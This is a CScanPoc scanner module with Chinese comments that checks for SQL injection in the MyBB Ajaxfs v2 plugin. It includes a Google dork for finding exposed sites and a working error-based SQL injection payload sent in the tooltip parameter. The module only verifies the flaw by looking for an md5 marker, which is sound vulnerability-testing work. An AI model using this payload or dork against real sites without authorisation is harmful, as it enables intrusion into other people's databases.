# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MyBB_0001'  # 平台漏洞编号，留空
    name = 'MyBB Ajaxfs v2 插件注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-11-29'  # 漏洞公布时间
    desc = '''
        google：inurl:ajaxfs.php?tooltip=    
        参数未过滤导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/888/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MyBB'  # 漏洞应用名称
    product_version = 'Ajaxfs v2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '41481f54-0a84-485c-acd1-44040c8b11e6'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/forum/ajaxfs.php?tooltip=211' and(select 1 from(select count(*),concat((select (select (select md5(c) from information_schema.tables where table_schema=database() limit 72,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '2'='1"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
